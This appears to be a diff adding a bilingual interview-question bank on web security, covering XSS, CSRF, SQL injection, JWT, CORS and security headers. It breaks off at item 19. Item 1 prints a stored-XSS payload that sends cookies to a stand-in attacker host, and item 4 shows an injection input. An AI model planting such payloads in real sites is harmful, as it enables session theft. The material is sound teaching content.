@@ -1,1 +1,462 @@
-[]
+[
+  {
+    "id": "security-q-1",
+    "topicId": "security",
+    "difficulty": "junior",
+    "question": {
+      "en": "What is the difference between reflected XSS and stored XSS? Provide an example of each.",
+      "ru": "В чем разница между reflected XSS и stored XSS? Приведите пример каждого."
+    },
+    "answer": {
+      "en": "### Reflected vs Stored XSS\n\nReflected XSS occurs when malicious script is sent in the request and reflected in the response without being saved. Stored XSS persists in the database and affects all users who view the content.\n\n```typescript\n// Reflected XSS: attacker sends malicious URL\n// example.com/search?q=<script>alert('xss')</script>\n\n// Stored XSS: attacker saves malicious data\nconst comment = \"<script>fetch('http://evil.com?cookie=' + document.cookie)</script>\";\ndb.comments.insert(comment);\n```\n\n**Common interview trap:** Confusing the persistence mechanism—reflected is temporary per request, stored is permanent in database.",
+      "ru": "### Reflected vs Stored XSS\n\nReflected XSS возникает, когда вредоносный скрипт отправляется в запросе и отображается в ответе без сохранения. Stored XSS сохраняется в базе данных и влияет на всех пользователей.\n\n```typescript\n// Reflected XSS: злоумышленник отправляет вредоносный URL\n// example.com/search?q=<script>alert('xss')</script>\n\n// Stored XSS: злоумышленник сохраняет вредоносные данные\nconst comment = \"<script>fetch('http://evil.com?cookie=' + document.cookie)</script>\";\ndb.comments.insert(comment);\n```\n\n**Типичная ошибка:** Путаница в механизме сохранения—reflected временный, stored постоянный в БД."
+    },
+    "tags": [
+      "xss-reflected",
+      "xss-stored",
+      "payload-injection"
+    ]
+  },
+  {
+    "id": "security-q-2",
+    "topicId": "security",
+    "difficulty": "junior",
+    "question": {
+      "en": "What is DOM-based XSS and how does it differ from reflected/stored XSS?",
+      "ru": "Что такое DOM-based XSS и чем он отличается от reflected/stored XSS?"
+    },
+    "answer": {
+      "en": "### DOM-based XSS\n\nDOM XSS occurs when client-side JavaScript writes untrusted data directly to the DOM without sanitization. Unlike reflected/stored XSS, the server is never involved—the vulnerability exists purely in client-side code.\n\n```typescript\n// DOM XSS: client-side JavaScript directly uses user input\nconst userInput = new URLSearchParams(window.location.search).get('name');\ndocument.getElementById('greeting').innerHTML = userInput; // DANGEROUS!\n\n// Safe alternative\ndocument.getElementById('greeting').textContent = userInput;\n```\n\n**Common interview trap:** Believing DOM XSS requires server reflection—it doesn't, the vulnerability is entirely client-side.",
+      "ru": "### DOM-based XSS\n\nDOM XSS возникает, когда клиентский JavaScript пишет недоверенные данные прямо в DOM без санитизации. В отличие от reflected/stored XSS, сервер не вовлечен—уязвимость чисто клиентская.\n\n```typescript\n// DOM XSS: клиентский JavaScript напрямую использует пользовательский ввод\nconst userInput = new URLSearchParams(window.location.search).get('name');\ndocument.getElementById('greeting').innerHTML = userInput; // ОПАСНО!\n\n// Безопасная альтернатива\ndocument.getElementById('greeting').textContent = userInput;\n```\n\n**Типичная ошибка:** Вера в то, что DOM XSS требует отражения сервером—нет, уязвимость полностью клиентская."
+    },
+    "tags": [
+      "xss-dom",
+      "dom-manipulation",
+      "client-side-security"
+    ]
+  },
+  {
+    "id": "security-q-3",
+    "topicId": "security",
+    "difficulty": "junior",
+    "question": {
+      "en": "Explain CSRF attacks and how CSRF tokens protect against them.",
+      "ru": "Объясните CSRF атаки и как CSRF токены защищают от них."
+    },
+    "answer": {
+      "en": "### CSRF Protection with Tokens\n\nCSRF exploits the browser's automatic cookie inclusion to make requests on behalf of an authenticated user from a malicious site. CSRF tokens are unique, per-session values that must be included in state-changing requests, preventing attackers from forging valid requests without access to the token.\n\n```typescript\n// Server generates unique token\nconst csrfToken = generateRandomToken();\nsession.csrfToken = csrfToken;\n\n// Form must include token\n<form method=\"POST\">\n  <input type=\"hidden\" name=\"_csrf\" value=\"<%= csrfToken %>\" />\n  <input type=\"text\" name=\"amount\" />\n</form>\n\n// Server validates token before processing\nif (req.body._csrf !== req.session.csrfToken) throw new Error('Invalid token');\n```\n\n**Common interview trap:** Thinking CSRF tokens prevent XSS—they don't; they're orthogonal defenses.",
+      "ru": "### CSRF защита с токенами\n\nCSRF использует автоматическое включение cookies браузером для создания запросов от имени аутентифицированного пользователя со вредоносного сайта. CSRF токены—это уникальные значения, которые должны быть включены в изменяющие состояние запросы, предотвращая подделку без доступа к токену.\n\n```typescript\n// Сервер генерирует уникальный токен\nconst csrfToken = generateRandomToken();\nsession.csrfToken = csrfToken;\n\n// Форма должна включать токен\n<form method=\"POST\">\n  <input type=\"hidden\" name=\"_csrf\" value=\"<%= csrfToken %>\" />\n  <input type=\"text\" name=\"amount\" />\n</form>\n\n// Сервер валидирует токен перед обработкой\nif (req.body._csrf !== req.session.csrfToken) throw new Error('Invalid');\n```\n\n**Типичная ошибка:** Думать, что CSRF токены предотвращают XSS—они нет, это независимые защиты."
+    },
+    "tags": [
+      "csrf",
+      "token-validation",
+      "state-changing-requests"
+    ]
+  },
+  {
+    "id": "security-q-4",
+    "topicId": "security",
+    "difficulty": "junior",
+    "question": {
+      "en": "What is SQL injection and how do prepared statements prevent it?",
+      "ru": "Что такое SQL injection и как подготовленные выражения защищают от них?"
+    },
+    "answer": {
+      "en": "### SQL Injection & Prepared Statements\n\nSQL injection occurs when untrusted user input is concatenated into SQL queries, allowing attackers to execute arbitrary SQL. Prepared statements separate SQL logic from data by using parameterized queries, ensuring user input is always treated as data, never as executable code.\n\n```typescript\n// VULNERABLE: string concatenation\nconst userId = req.query.id;\nconst query = `SELECT * FROM users WHERE id = ${userId}`;\n// Attacker input: 1 OR 1=1 executes all rows\n\n// SAFE: prepared statement\nconst query = 'SELECT * FROM users WHERE id = ?';\ndb.run(query, [userId]);\n// User input is safely escaped as data\n```\n\n**Common interview trap:** Confusing escaping with parameterization—parameterized queries are more reliable.",
+      "ru": "### SQL Injection и подготовленные выражения\n\nSQL injection возникает, когда недоверенный ввод пользователя конкатенируется в SQL запросы. Подготовленные выражения разделяют логику SQL от данных, гарантируя, что пользовательский ввод всегда рассматривается как данные.\n\n```typescript\n// УЯЗВИМО: конкатенация строк\nconst userId = req.query.id;\nconst query = `SELECT * FROM users WHERE id = ${userId}`;\n// Ввод злоумышленника: 1 OR 1=1 выполняет все строки\n\n// БЕЗОПАСНО: подготовленное выражение\nconst query = 'SELECT * FROM users WHERE id = ?';\ndb.run(query, [userId]);\n// Ввод пользователя безопасно экранирован\n```\n\n**Типичная ошибка:** Путаница между экранированием и параметризацией—параметризованные запросы надежнее."
+    },
+    "tags": [
+      "sql-injection",
+      "prepared-statements",
+      "parameterized-queries"
+    ]
+  },
+  {
+    "id": "security-q-5",
+    "topicId": "security",
+    "difficulty": "junior",
+    "question": {
+      "en": "Why is HTTPS important and what is the basic role of SSL/TLS certificates in secure communication?",
+      "ru": "Почему HTTPS важен и какова роль SSL/TLS сертификатов в безопасной коммуникации?"
+    },
+    "answer": {
+      "en": "### HTTPS and SSL/TLS Certificates\n\nHTTPS encrypts data in transit, preventing eavesdropping and man-in-the-middle attacks. SSL/TLS certificates authenticate the server's identity and establish an encrypted connection—the certificate proves the domain ownership and enables the browser to verify it's talking to the legitimate server.\n\n```typescript\n// HTTP: plaintext transmission (vulnerable)\nGET /api/user HTTP/1.1\nAuthorization: Bearer sensitive_token_exposed\n\n// HTTPS: encrypted transmission (secure)\n// Same request but encrypted end-to-end\n// Certificate validates server: CN=example.com, issued by trusted CA\n\nconst https = require('https');\nconst fs = require('fs');\nconst options = {\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n};\nhttps.createServer(options, app).listen(443);\n```\n\n**Common interview trap:** Thinking HTTPS alone prevents all attacks—it protects data in transit but doesn't prevent XSS, CSRF, or SQL injection.",
+      "ru": "### HTTPS и SSL/TLS сертификаты\n\nHTTPS шифрует данные при передаче, предотвращая подслушивание и атаки man-in-the-middle. SSL/TLS сертификаты аутентифицируют сервер и устанавливают зашифрованное соединение—сертификат доказывает владение доменом.\n\n```typescript\n// HTTP: открередача в открытом виде (уязвимо)\nGET /api/user HTTP/1.1\nAuthorization: Bearer sensitive_token_exposed\n\n// HTTPS: зашифрованная передача (безопасно)\n// Тот же запрос но зашифрован end-to-end\n// Сертификат валидирует сервер: CN=example.com, от доверенного CA\n\nconst https = require('https');\nconst fs = require('fs');\nconst options = {\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n};\nhttps.createServer(options, app).listen(443);\n```\n\n**Типичная ошибка:** Думать, что HTTPS предотвращает все атаки—он защищает данные при передаче, но не от XSS, CSRF или SQL injection."
+    },
+    "tags": [
+      "https",
+      "ssl-tls",
+      "encryption",
+      "certificates"
+    ]
+  },
+  {
+    "id": "security-q-6",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "Explain the difference between HttpOnly, Secure, and SameSite cookie flags. When should each be used and what attacks do they prevent?",
+      "ru": "Объясните разницу между флагами HttpOnly, Secure и SameSite для cookies. Когда использовать каждый и какие атаки они предотвращают?"
+    },
+    "answer": {
+      "en": "### Cookie Security Flags\n\nHttpOnly prevents JavaScript access (XSS protection), Secure ensures transmission only over HTTPS, and SameSite blocks cross-site requests (CSRF protection). Use all three together in production for maximum security.\n\n```typescript\nresponse.setHeader('Set-Cookie', \n  'token=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600'\n);\n```\n\n**Common interview trap:** Thinking HttpOnly prevents CSRF—it only prevents JavaScript access, not cross-site requests.",
+      "ru": "### Флаги безопасности Cookies\n\nHttpOnly предотвращает доступ через JavaScript (защита от XSS), Secure обеспечивает передачу только по HTTPS, а SameSite блокирует кросс-сайтовые запросы (защита от CSRF). Используйте все три вместе в продакшене.\n\n```typescript\nresponse.setHeader('Set-Cookie', \n  'token=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600'\n);\n```\n\n**Типичная ошибка:** Думать, что HttpOnly предотвращает CSRF—он только блокирует доступ из JavaScript."
+    },
+    "tags": [
+      "cookie-security",
+      "http-only",
+      "same-site",
+      "csrf-protection"
+    ]
+  },
+  {
+    "id": "security-q-7",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "How should you validate JWT tokens on the server side? What are the key validation steps and how do you handle expired tokens?",
+      "ru": "Как правильно валидировать JWT токены на серверной стороне? Какие ключевые шаги валидации и как обрабатывать истекшие токены?"
+    },
+    "answer": {
+      "en": "### JWT Validation Steps\n\nVerify signature using the secret key, check expiration time (exp claim), validate issuer (iss) and audience (aud), and ensure token hasn't been tampered with. Expired tokens should trigger a refresh token flow or require re-authentication.\n\n```typescript\nconst decoded = jwt.verify(token, SECRET_KEY);\nif (decoded.exp * 1000 < Date.now()) {\n  throw new Error('Token expired');\n}\nif (decoded.aud !== EXPECTED_AUDIENCE) {\n  throw new Error('Invalid audience');\n}\n```\n\n**Common interview trap:** Only checking the signature without validating exp, iss, and aud claims.",
+      "ru": "### Шаги валидации JWT\n\nПроверьте подпись с помощью секретного ключа, проверьте время истечения (claim exp), валидируйте издателя (iss) и аудиторию (aud), убедитесь что токен не был изменен. Истекшие токены должны инициировать обновление через refresh token или переаутентификацию.\n\n```typescript\nconst decoded = jwt.verify(token, SECRET_KEY);\nif (decoded.exp * 1000 < Date.now()) {\n  throw new Error('Token expired');\n}\nif (decoded.aud !== EXPECTED_AUDIENCE) {\n  throw new Error('Invalid audience');\n}\n```\n\n**Типичная ошибка:** Проверка только подписи без валидации claims exp, iss и aud."
+    },
+    "tags": [
+      "jwt-validation",
+      "token-expiration",
+      "signature-verification"
+    ]
+  },
+  {
+    "id": "security-q-8",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "What is CORS and how do you configure it securely? What are the risks of using Access-Control-Allow-Origin: *?",
+      "ru": "Что такое CORS и как его безопасно настроить? Каковы риски использования Access-Control-Allow-Origin: *?"
+    },
+    "answer": {
+      "en": "### CORS Security Configuration\n\nCORS controls which origins can access your API. Using * allows any origin, which is dangerous for sensitive endpoints—always whitelist specific origins and avoid sending credentials with wildcard origins. Validate preflight requests properly.\n\n```typescript\napp.use(cors({\n  origin: ['https://trusted-domain.com'],\n  credentials: true,\n  methods: ['GET', 'POST'],\n  allowedHeaders: ['Content-Type', 'Authorization']\n}));\n```\n\n**Common interview trap:** Thinking * is acceptable for public APIs—credentials will be rejected if origin is *.",
+      "ru": "### Безопасная настройка CORS\n\nCORS контролирует какие origin'ы могут получить доступ к вашему API. Использование * позволяет любому origin'у, что опасно для чувствительных endpoints'ов—всегда используйте whitelist конкретных origin'ов и избегайте отправки credentials с wildcard. Правильно валидируйте preflight запросы.\n\n```typescript\napp.use(cors({\n  origin: ['https://trusted-domain.com'],\n  credentials: true,\n  methods: ['GET', 'POST'],\n  allowedHeaders: ['Content-Type', 'Authorization']\n}));\n```\n\n**Типичная ошибка:** Думать что * приемлем для публичных API—credentials будут отклонены если origin это *."
+    },
+    "tags": [
+      "cors",
+      "origin-validation",
+      "cross-origin-security"
+    ]
+  },
+  {
+    "id": "security-q-9",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "Describe the OAuth 2.0 authorization code flow. What are the security benefits of using the code flow instead of the implicit flow?",
+      "ru": "Опишите OAuth 2.0 код авторизации. Какие преимущества безопасности у использования code flow вместо implicit flow?"
+    },
+    "answer": {
+      "en": "### OAuth 2.0 Code Flow Security\n\nAuthorization code flow exchanges a short-lived authorization code for tokens on a secure backend channel, preventing tokens from being exposed in browser history or URLs. Implicit flow exposed access tokens directly in URLs, making them vulnerable to interception and XSS.\n\n```typescript\n// Code flow: client receives code, backend exchanges for token\nconst token = await fetch('https://oauth.provider/token', {\n  method: 'POST',\n  body: JSON.stringify({\n    code: authCode,\n    client_id: CLIENT_ID,\n    client_secret: CLIENT_SECRET\n  })\n});\n```\n\n**Common interview trap:** Confusing code flow with client credentials flow—they serve different purposes.",
+      "ru": "### Безопасность OAuth 2.0 Code Flow\n\nCode flow обменивает кратковременный код авторизации на токены через защищенный backend канал, предотвращая утечку токенов в истории браузера или URL'ах. Implicit flow выдавал access tokens прямо в URL'ах, делая их уязвимыми для перехвата и XSS.\n\n```typescript\n// Code flow: client получает code, backend обменивает на token\nconst token = await fetch('https://oauth.provider/token', {\n  method: 'POST',\n  body: JSON.stringify({\n    code: authCode,\n    client_id: CLIENT_ID,\n    client_secret: CLIENT_SECRET\n  })\n});\n```\n\n**Типичная ошибка:** Путать code flow с client credentials flow—они служат разным целям."
+    },
+    "tags": [
+      "oauth2",
+      "authorization-code-flow",
+      "token-security"
+    ]
+  },
+  {
+    "id": "security-q-10",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "What is a Content Security Policy (CSP) header and how does it prevent XSS attacks? Provide an example of a strict CSP configuration.",
+      "ru": "Что такое Content Security Policy (CSP) заголовок и как он предотвращает XSS атаки? Приведите пример строгой конфигурации CSP."
+    },
+    "answer": {
+      "en": "### Content Security Policy\n\nCSP restricts which resources (scripts, styles, images) can be loaded, preventing inline script injection and XSS attacks. A strict policy disallows inline scripts, external scripts, and eval, requiring all scripts to come from whitelisted sources with cryptographic nonces.\n\n```typescript\nresponse.setHeader(\n  'Content-Security-Policy',\n  \"default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'\"\n);\n```\n\n**Common interview trap:** Using 'unsafe-inline' defeats most CSP protections—use nonces or hashes instead.",
+      "ru": "### Content Security Policy\n\nCSP ограничивает какие ресурсы (скрипты, стили, изображения) могут быть загружены, предотвращая инъекцию встроенных скриптов и XSS атаки. Строгая политика запрещает встроенные скрипты, внешние скрипты и eval, требуя чтобы все скрипты приходили из whitelisted sources с криптографическими nonces.\n\n```typescript\nresponse.setHeader(\n  'Content-Security-Policy',\n  \"default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'\"\n);\n```\n\n**Типичная ошибка:** Использование 'unsafe-inline' лишает CSP большей части защиты—используйте nonces или hashes."
+    },
+    "tags": [
+      "csp-header",
+      "xss-prevention",
+      "content-security-policy"
+    ]
+  },
+  {
+    "id": "security-q-11",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "Explain the purpose of Content Security Policy (CSP) headers and provide an example of how to set a restrictive CSP that only allows scripts from your own domain.",
+      "ru": "Объясните назначение заголовков Content Security Policy (CSP) и приведите пример того, как установить ограничивающий CSP, который разрешает скрипты только с вашего собственного домена."
+    },
+    "answer": {
+      "en": "### CSP Header Purpose\n\nCSP prevents XSS attacks by controlling which resources can be loaded. It whitelist-based approach stops inline scripts and external malicious content.\n\n```typescript\nres.setHeader(\n  'Content-Security-Policy',\n  \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'\"\n);\n```\n\n**Common interview trap:** Thinking CSP blocks all inline scripts except when you explicitly allow them with 'unsafe-inline'—this defeats the purpose.",
+      "ru": "### Назначение CSP\n\nCSP предотвращает XSS атаки, контролируя, какие ресурсы могут быть загружены. Это подход на основе белого списка останавливает встроенные скрипты и внешний вредоносный контент.\n\n```typescript\nres.setHeader(\n  'Content-Security-Policy',\n  \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'\"\n);\n```\n\n**Типичная ошибка:** Думать, что CSP блокирует все встроенные скрипты, кроме случаев, когда вы явно разрешаете их с 'unsafe-inline'."
+    },
+    "tags": [
+      "CSP",
+      "XSS-prevention",
+      "header-security"
+    ]
+  },
+  {
+    "id": "security-q-12",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "How should you structure and validate a JWT token? Explain the three main parts and what makes a validation check complete.",
+      "ru": "Как вы должны структурировать и проверять JWT токен? Объясните три основные части и что делает проверку полной."
+    },
+    "answer": {
+      "en": "### JWT Structure and Validation\n\nJWT has three parts separated by dots: header (algorithm), payload (claims), signature (verification). Validation must check signature, expiration, and issuer.\n\n```typescript\nconst validateJWT = (token) => {\n  const decoded = jwt.verify(token, SECRET, {\n    algorithms: ['HS256'],\n    issuer: 'your-app',\n    audience: 'your-audience'\n  });\n  return decoded.exp > Date.now() / 1000;\n};\n```\n\n**Common interview trap:** Only checking if the token is parseable without verifying the signature—this is completely insecure.",
+      "ru": "### Структура и валидация JWT\n\nJWT состоит из трёх частей, разделённых точками: заголовок (алгоритм), полезная нагрузка (claims), подпись (верификация). Проверка должна включать проверку подписи, срока действия и издателя.\n\n```typescript\nconst validateJWT = (token) => {\n  const decoded = jwt.verify(token, SECRET, {\n    algorithms: ['HS256'],\n    issuer: 'your-app',\n    audience: 'your-audience'\n  });\n  return decoded.exp > Date.now() / 1000;\n};\n```\n\n**Типичная ошибка:** Проверять только, можно ли распарсить токен, без проверки подписи—это полностью небезопасно."
+    },
+    "tags": [
+      "JWT",
+      "token-validation",
+      "authentication"
+    ]
+  },
+  {
+    "id": "security-q-13",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "Describe the OAuth 2.0 Authorization Code flow and explain why the authorization code itself should be short-lived and used only once.",
+      "ru": "Опишите поток OAuth 2.0 Authorization Code и объясните, почему код авторизации должен быть недолговечным и использоваться только один раз."
+    },
+    "answer": {
+      "en": "### OAuth 2.0 Authorization Code Flow\n\nThe flow redirects user to auth server, returns a code to the client, and client exchanges it for an access token using a backend call. Short lifespans and single-use prevent code interception attacks.\n\n```typescript\napp.get('/callback', async (req, res) => {\n  const { code } = req.query;\n  const token = await exchangeCodeForToken(code, CLIENT_SECRET);\n  res.cookie('access_token', token, { secure: true, httpOnly: true });\n});\n```\n\n**Common interview trap:** Passing the access token directly in the URL instead of exchanging the code server-to-server—exposing tokens in browser history.",
+      "ru": "### Поток OAuth 2.0 Authorization Code\n\nПоток перенаправляет пользователя на сервер авторизации, возвращает код клиенту, и клиент обменивает его на токен доступа, используя вызов серверной части. Короткие сроки и одноразовое использование предотвращают атаки перехвата кода.\n\n```typescript\napp.get('/callback', async (req, res) => {\n  const { code } = req.query;\n  const token = await exchangeCodeForToken(code, CLIENT_SECRET);\n  res.cookie('access_token', token, { secure: true, httpOnly: true });\n});\n```\n\n**Типичная ошибка:** Передавать токен доступа напрямую в URL вместо обмена кода серверу-на-сервер—раскрытие токенов в истории браузера."
+    },
+    "tags": [
+      "OAuth2.0",
+      "authorization-code-flow",
+      "authentication"
+    ]
+  },
+  {
+    "id": "security-q-14",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "What is CORS and how can misconfigured CORS settings lead to security vulnerabilities? Provide an example of a secure CORS configuration.",
+      "ru": "Что такое CORS и как неправильно настроенные параметры CORS могут привести к уязвимостям безопасности? Приведите пример безопасной конфигурации CORS."
+    },
+    "answer": {
+      "en": "### CORS Security\n\nCORS controls which domains can access your API. Using `*` as origin allows any domain to make requests, enabling csrf and data theft. Restrict to specific trusted domains.\n\n```typescript\napp.use(cors({\n  origin: ['https://trusted.com', 'https://app.com'],\n  credentials: true,\n  methods: ['GET', 'POST'],\n  allowedHeaders: ['Content-Type']\n}));\n```\n\n**Common interview trap:** Setting `origin: '*'` with `credentials: true`—this combination is invalid and browsers will reject it, but it indicates a dangerous mindset.",
+      "ru": "### Безопасность CORS\n\nCORS контролирует, какие домены могут получать доступ к вашему API. Использование `*` как origin разрешает любому домену делать запросы, что позволяет csrf и кража данных. Ограничьте только доверенные домены.\n\n```typescript\napp.use(cors({\n  origin: ['https://trusted.com', 'https://app.com'],\n  credentials: true,\n  methods: ['GET', 'POST'],\n  allowedHeaders: ['Content-Type']\n}));\n```\n\n**Типичная ошибка:** Установка `origin: '*'` с `credentials: true`—это недопустимая комбинация, браузеры её отклонят, но это указывает на опасное мышление."
+    },
+    "tags": [
+      "CORS",
+      "cross-origin",
+      "access-control"
+    ]
+  },
+  {
+    "id": "security-q-15",
+    "topicId": "security",
+    "difficulty": "middle",
+    "question": {
+      "en": "Explain the security flags for HTTP cookies (HttpOnly, Secure, SameSite) and how they mitigate different attack vectors. When should you use each one?",
+      "ru": "Объясните флаги безопасности для HTTP cookies (HttpOnly, Secure, SameSite) и как они смягчают различные векторы атак. Когда вы должны использовать каждый из них?"
+    },
+    "answer": {
+      "en": "### Cookie Security Flags\n\nHttpOnly blocks JavaScript access preventing XSS theft, Secure sends only over HTTPS, SameSite prevents CSRF by restricting cross-site requests. All three should be used together for sensitive cookies.\n\n```typescript\nres.cookie('sessionId', token, {\n  httpOnly: true,      // Prevents XSS\n  secure: true,        // HTTPS only\n  sameSite: 'Strict',  // Prevents CSRF\n  maxAge: 3600000\n});\n```\n\n**Common interview trap:** Using SameSite alone thinking it blocks XSS—SameSite only prevents CSRF, you need HttpOnly for XSS protection.",
+      "ru": "### Флаги безопасности Cookie\n\nHttpOnly блокирует доступ JavaScript, предотвращая кражу XSS, Secure отправляет только через HTTPS, SameSite предотвращает CSRF ограничивая кросс-сайт запросы. Все три должны использоваться вместе для чувствительных cookies.\n\n```typescript\nres.cookie('sessionId', token, {\n  httpOnly: true,      // Prevents XSS\n  secure: true,        // HTTPS only\n  sameSite: 'Strict',  // Prevents CSRF\n  maxAge: 3600000\n});\n```\n\n**Типичная ошибка:** Использование SameSite в одиночку думая, что он блокирует XSS—SameSite только предотвращает CSRF, вам нужен HttpOnly для защиты XSS."
+    },
+    "tags": [
+      "cookie-flags",
+      "HttpOnly",
+      "CSRF-prevention",
+      "XSS-prevention"
+    ]
+  },
+  {
+    "id": "security-q-16",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "Explain the algorithm confusion attack in JWT and how to prevent it. What happens when an attacker changes the algorithm from RS256 to HS256?",
+      "ru": "Объясните атаку confusion algorithm в JWT и как её предотвратить. Что происходит, когда злоумышленник меняет алгоритм с RS256 на HS256?"
+    },
+    "answer": {
+      "en": "### Algorithm Confusion Attack\n\nWhen you switch from RS256 (asymmetric) to HS256 (symmetric), the server might use the public key as the HMAC secret, allowing attackers to forge tokens. Always explicitly specify the expected algorithm and reject mismatches.\n\n```typescript\nconst jwt = require('jsonwebtoken');\n\n// VULNERABLE\nconst decoded = jwt.verify(token, publicKey); // accepts any algorithm\n\n// SECURE\nconst decoded = jwt.verify(token, publicKey, {\n  algorithms: ['RS256'] // explicitly whitelist algorithm\n});\n```\n\n**Common interview trap:** Assuming algorithm validation happens automatically by default—it doesn't.",
+      "ru": "### Атака Confusion Algorithm\n\nКогда вы переходите с RS256 (асимметричный) на HS256 (симметричный), сервер может использовать открытый ключ как HMAC-секрет, позволяя злоумышленникам подделывать токены. Всегда явно указывайте ожидаемый алгоритм и отклоняйте несовпадения.\n\n```typescript\nconst jwt = require('jsonwebtoken');\n\n// УЯЗВИМО\nconst decoded = jwt.verify(token, publicKey); // принимает любой алгоритм\n\n// БЕЗОПАСНО\nconst decoded = jwt.verify(token, publicKey, {\n  algorithms: ['RS256'] // явно указываем алгоритм\n});\n```\n\n**Типичная ошибка:** Предположение, что валидация алгоритма происходит автоматически по умолчанию."
+    },
+    "tags": [
+      "jwt-security",
+      "algorithm-confusion",
+      "token-validation"
+    ]
+  },
+  {
+    "id": "security-q-17",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "Design a refresh token rotation strategy that prevents token replay attacks. How would you handle token family tracking?",
+      "ru": "Спроектируйте стратегию ротации refresh токенов, которая предотвращает атаки replay. Как вы будете отслеживать семейства токенов?"
+    },
+    "answer": {
+      "en": "### Refresh Token Rotation with Family Tracking\n\nIssue a new refresh token on every rotation and track token families to detect reuse. If an old token is replayed, revoke the entire family, indicating a compromise.\n\n```typescript\n// On token refresh\nconst refreshToken = async (oldToken: string) => {\n  const decoded = verify(oldToken, SECRET);\n  const family = decoded.familyId || uuid();\n  \n  // Check if token was already used (replay)\n  if (await isTokenUsed(oldToken)) {\n    await revokeTokenFamily(family); // breach detected\n    throw new Error('Token replay detected');\n  }\n  \n  // Mark as used and issue new token\n  await markTokenAsUsed(oldToken);\n  return { accessToken, refreshToken: newToken(family) };\n};\n```\n\n**Common interview trap:** Thinking rotation alone prevents replay—you need family tracking and reuse detection.",
+      "ru": "### Ротация Refresh Токена с Отслеживанием Семейства\n\nВыдавайте новый refresh токен при каждой ротации и отслеживайте семейства токенов для обнаружения повторного использования. Если старый токен воспроизведён, отозовите всё семейство, что указывает на компрометацию.\n\n```typescript\n// При обновлении токена\nconst refreshToken = async (oldToken: string) => {\n  const decoded = verify(oldToken, SECRET);\n  const family = decoded.familyId || uuid();\n  \n  // Проверяем, был ли токен уже использован (replay)\n  if (await isTokenUsed(oldToken)) {\n    await revokeTokenFamily(family); // обнаружена компрометация\n    throw new Error('Token replay detected');\n  }\n  \n  // Отмечаем как использованный и выдаём новый\n  await markTokenAsUsed(oldToken);\n  return { accessToken, refreshToken: newToken(family) };\n};\n```\n\n**Типичная ошибка:** Считать, что ротация одна предотвращает replay—нужна идентификация семейства и обнаружение повторного использования."
+    },
+    "tags": [
+      "refresh-token",
+      "token-rotation",
+      "replay-attack",
+      "token-family"
+    ]
+  },
+  {
+    "id": "security-q-18",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "How would you audit and implement critical security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options)? What's the difference between Content-Security-Policy and Content-Security-Policy-Report-Only?",
+      "ru": "Как бы вы проверили и внедрили критические заголовки безопасности (CSP, HSTS, X-Frame-Options, X-Content-Type-Options)? В чём разница между Content-Security-Policy и Content-Security-Policy-Report-Only?"
+    },
+    "answer": {
+      "en": "### Security Headers Implementation\n\nCSP blocks inline scripts and restricts resource sources; Report-Only logs violations without blocking. HSTS forces HTTPS, X-Frame-Options prevents clickjacking, X-Content-Type-Options prevents MIME sniffing. Start with Report-Only to identify issues before enforcing.\n\n```typescript\napp.use((req, res, next) => {\n  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('Content-Security-Policy-Report-Only',\n    \"default-src 'self'; script-src 'self' https://trusted.com; report-uri /csp-report\");\n  next();\n});\n```\n\n**Common interview trap:** Confusing CSP with X-Frame-Options—CSP controls resources, X-Frame-Options only prevents embedding.",
+      "ru": "### Внедрение Заголовков Безопасности\n\nCSP блокирует встроенные скрипты и ограничивает источники ресурсов; Report-Only логирует нарушения без блокировки. HSTS принудительно использует HTTPS, X-Frame-Options предотвращает clickjacking, X-Content-Type-Options предотвращает MIME sniffing. Начните с Report-Only для выявления проблем перед внедрением.\n\n```typescript\napp.use((req, res, next) => {\n  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('Content-Security-Policy-Report-Only',\n    \"default-src 'self'; script-src 'self' https://trusted.com; report-uri /csp-report\");\n  next();\n});\n```\n\n**Типичная ошибка:** Путаница между CSP и X-Frame-Options—CSP контролирует ресурсы, X-Frame-Options только предотвращает встраивание."
+    },
+    "tags": [
+      "security-headers",
+      "csp",
+      "hsts",
+      "clickjacking-prevention"
+    ]
+  },
+  {
+    "id": "security-q-19",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "Explain your strategy for managing secrets (API keys, database passwords, tokens) in production. How do you prevent secrets from being committed to git and rotate them safely?",
+      "ru": "Объясните вашу стратегию управления секретами (API ключи, пароли БД, токены) в production. Как вы предотвращаете commit секретов в git и безопасно их ротируете?"
+    },
+    "answer": {
